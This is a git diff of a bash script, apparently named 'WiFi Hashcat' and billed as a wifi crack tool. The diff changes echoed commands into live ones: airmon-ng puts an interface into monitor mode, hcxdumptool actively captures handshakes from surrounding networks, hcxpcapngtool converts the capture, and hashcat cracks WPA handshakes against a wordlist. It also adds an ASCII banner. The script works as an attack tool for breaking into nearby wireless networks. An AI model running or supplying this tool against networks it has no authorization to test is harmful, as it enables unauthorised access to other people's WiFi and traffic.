@@ -49,10 +49,21 @@ function box () {
   	tput sgr 0m
   	echo
 } 
-
-echo "#########BANNER TODO##########"
 echo
-
+echo "${RED}    	       @@  @@@  @@@ @@@ @@@@@@@@ @@@      @@@  @@@  @@@@@@
+              @@!  @@!  @@! @@! @@!      @@!      @@!  @@@ !@@    
+              @${YELLOW}!!  !!${RED}@  @${YELLOW}!${RED}@ ${YELLOW}!!${RED}@ @${YELLOW}!!!:!   !!@      @!@  !@!  !@@!! 
+               ${YELLOW}!:  ${RED}!!${YELLOW}:  ${RED}!!  !!: !!:      !!:       !: .:!      !:!
+                ::.:  :::   :    :       :           ::    ::.: : 
+                                                                  
+          @@@  @@@  @@@@@@   @@@@@@ @@@  @@@  @@@@@@@  @@@@@@  @@@@@@@
+          @@!  @@@ @@!  @@@ !@@     @@!  @@@ !@@      @@!  @@@   @@!  
+          @!@!@!@! @!@!@!@!  !@@!!  @!@!@!@! !@!      @!@!@!@!   @!!  
+          !!:  !!! !!:  !!!     !:! !!:  !!! :!!      !!:  !!!   !!:  
+           :   : :  :   : : ::.: :   :   : :  :: :: :  :   : :    :   
+                                                                      
+"
+echo
 if [ "$EUID" -ne 0 ]
   then 
   echo "${YELLOW}[${RED}!${YELLOW}] ${RED} Error: this script must be run as ${YELLOW}root" 
@@ -60,9 +71,6 @@ if [ "$EUID" -ne 0 ]
   exit
 fi
 
-#box "${YELLOW}[-] ${GREEN}Hi, welcome to the wifi crack tool"
-echo
-echo
 box "${YELLOW}[-] ${GREEN} Write the name of the interface:"
 echo "${YELLOW}"
 ip link show | awk '{print $2}'
@@ -91,16 +99,18 @@ while true; do #You sure while (y/n)
 done #End sure while (y/n)
 
 echo ${NC}
-echo "airmon-ng start $INTERFACE"
+airmon-ng start $INTERFACE
+systemctl start NetworkManager.service
+systemctl start wpa_supplicant.service
 
 echo
 box "${YELLOW}[-] ${GREEN} Let's start the dump of the wifi network around you. Press ${YELLOW}CTRL-C${GREEN} when you have finished"
 now=$(date +"%Y-%m-%d")
-echo "hcxdumptool -i $INTERFACE -o $now.pcapng --active_beacon --enable_status=15"
+hcxdumptool -i $INTERFACE -o $now.pcapng --active_beacon --enable_status=15
 
 echo
 box "${YELLOW}[-] ${GREEN} Let's decypt the captured pcap file"
-echo "hcxpcapngtool -o $now.hc22000 -E essidlist$now $now.pcapng"
+hcxpcapngtool -o $now.hc22000 -E essidlist$now $now.pcapng
 
 echo
 box "${YELLOW}[-] ${GREEN} Enter the absolute path of the wordlist:"
@@ -129,4 +139,7 @@ while true; do #You sure while (y/n)
 done #End sure while (y/n)
 	
 box "${YELLOW}-] ${GREEN} Crack the captured hc22000 handshake"
-echo "hashcat -m 22000 hash.hc22000 $WORDLISTPATH"
+hashcat -m 22000 hash.hc22000 $WORDLISTPATH 
+echo
+
+box "${YELLOW}[-] ${GREEN} DONE!"
